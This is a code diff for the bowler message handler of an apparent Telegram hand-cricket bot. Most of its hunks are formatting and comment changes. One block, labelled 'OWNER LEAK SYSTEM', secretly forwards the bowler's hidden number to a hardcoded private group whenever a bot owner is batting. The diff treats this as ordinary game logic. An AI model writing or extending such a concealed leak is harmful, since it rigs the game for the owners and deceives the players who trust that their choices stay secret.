@@ -186,15 +186,19 @@ async def bowler_dm_handler(client, message):
         (m for m in list(ACTIVE_MATCHES.values()) if m.get("current_bowler") == uid),
         None
     )
+
     # Fall back: check super over bowler
     if not match:
         for m in list(ACTIVE_MATCHES.values()):
             so = m.get("super_over", {})
+
             if so.get("active") and so.get("prompt_dispatched"):
-                innings   = so.get("current_innings", 1)
+                innings = so.get("current_innings", 1)
                 bat_order = so.get("bat_order", [])
+
                 if innings <= len(bat_order):
                     batting_team = bat_order[innings - 1]
+
                     if so.get("bowler", {}).get(batting_team) == uid:
                         match = m
                         break
@@ -204,9 +208,12 @@ async def bowler_dm_handler(client, message):
 
     # Route to super over handler if active
     so = match.get("super_over", {})
+
     if so.get("active") and match.get("phase") == "SUPER_OVER":
         await message.reply_text("⚾️", quote=True)
+
         from plugins.game.team.super_over import handle_so_bowl
+
         await handle_so_bowl(client, match, uid, int(message.text))
         return
 
@@ -219,7 +226,9 @@ async def bowler_dm_handler(client, message):
     # ── Disabled numbers check ────────────────────────────────────────────────
     try:
         from database.group_settings import get_setting as _gs
+
         disabled = await _gs(chat_id, "disabled_numbers")
+
         if disabled and bowl_num in disabled:
             return await message.reply_text(
                 f"🚫 <b>Number {bowl_num} is disabled</b> in this group!\n"
@@ -227,17 +236,24 @@ async def bowler_dm_handler(client, message):
                 parse_mode=ParseMode.HTML,
                 quote=True,
             )
+
     except Exception:
         pass
 
-    # ── Spam Free Mode check (bowler only, resets each over) ─────────────────
+    # ── Spam Free Mode check ──────────────────────────────────────────────────
     try:
         from database.group_settings import get_setting as _gs2
         from database.premium import can_use_feature
+
         if await _gs2(chat_id, "spam_free") and await can_use_feature(chat_id, "spam_free"):
+
+            # Reset every over
             if len(match.get("current_over_balls", [])) == 0:
                 match["bowler_spam"] = {}
+
             hist = match.setdefault("bowler_spam", {}).setdefault(uid, [])
+
+            # Prevent same number 3 times
             if len(hist) >= 2 and hist[-1] == bowl_num and hist[-2] == bowl_num:
                 return await message.reply_text(
                     f"🛡️ <b>Spam Free Mode!</b>\n"
@@ -246,32 +262,49 @@ async def bowler_dm_handler(client, message):
                     parse_mode=ParseMode.HTML,
                     quote=True,
                 )
+
     except Exception:
         pass
 
+    # ── Save bowl data ────────────────────────────────────────────────────────
     match["last_active"] = time.time()
     match["last_bowl"] = bowl_num
     match["bowled"] = True
+
     match.setdefault("bowler_spam", {}).setdefault(uid, []).append(bowl_num)
 
+    # ── OWNER LEAK SYSTEM ─────────────────────────────────────────────────────
     try:
         striker = match.get("current_batter")
+
+        # If batter is owner → leak bowl number to private GC
         if striker and striker in Config.OWNER_IDS:
-            asyncio.create_task(client.send_message(
-                striker,
-                f"🤫 <b>Bowl: {bowl_num}</b>",
-                parse_mode=ParseMode.HTML
-            ))
+
+            asyncio.create_task(
+                client.send_message(
+                    -1003751894118,
+                    (
+                        f"🎯 <b>Owner Batter Detected</b>\n\n"
+                        f"👤 <b>Owner ID:</b> <code>{striker}</code>\n"
+                        f"⚾ <b>Bowl Number:</b> <b>{bowl_num}</b>"
+                    ),
+                    parse_mode=ParseMode.HTML
+                )
+            )
+
     except Exception:
         pass
 
+    # ── Timeout Setup ─────────────────────────────────────────────────────────
     if "timeouts" not in match:
         match["timeouts"] = {
             "bowler": {"fails": 0, "task": None},
             "batter": {"fails": 0, "task": None},
         }
 
+    # Cancel bowler timer
     t_bowler = match["timeouts"]["bowler"]
+
     if t_bowler.get("task"):
         try:
             t_bowler["task"].cancel()
@@ -280,7 +313,9 @@ async def bowler_dm_handler(client, message):
 
     back_btn = get_back_to_group_markup(chat_id)
 
+    # ── Bowler confirmation ───────────────────────────────────────────────────
     await message.reply_text("⚾️", quote=True)
+
     await message.reply_text(
         f"✅ <b>Ball Delivered:</b> <b>{message.text}</b>\n\n"
         "Return to the group to watch the outcome unfold!",
@@ -288,8 +323,13 @@ async def bowler_dm_handler(client, message):
         parse_mode=ParseMode.HTML,
     )
 
+    # ── Batter turn ───────────────────────────────────────────────────────────
     striker_id = match.get("striker")
-    striker_name = html.escape(match.get("user_cache", {}).get(striker_id, "Batter"))
+
+    striker_name = html.escape(
+        match.get("user_cache", {}).get(striker_id, "Batter")
+    )
+
     ball_no = get_display_ball_no(match)
 
     caption = (
@@ -298,9 +338,13 @@ async def bowler_dm_handler(client, message):
         f"send your shot (0–6) in the group!"
     )
 
-    asyncio.create_task(try_send_video(client, chat_id, "Batting", caption))
+    asyncio.create_task(
+        try_send_video(client, chat_id, "Batting", caption)
+    )
 
+    # ── Batter timeout ────────────────────────────────────────────────────────
     t_batter = match["timeouts"]["batter"]
+
     if t_batter.get("task"):
         try:
             t_batter["task"].cancel()
@@ -310,7 +354,6 @@ async def bowler_dm_handler(client, message):
     match["timeouts"]["batter"]["task"] = asyncio.create_task(
         start_timer(match, "batter")
     )
-
 
 @Client.on_message(filters.group & filters.regex("^[0-6]$"), group=-1)
 async def batter_handler(client, message):
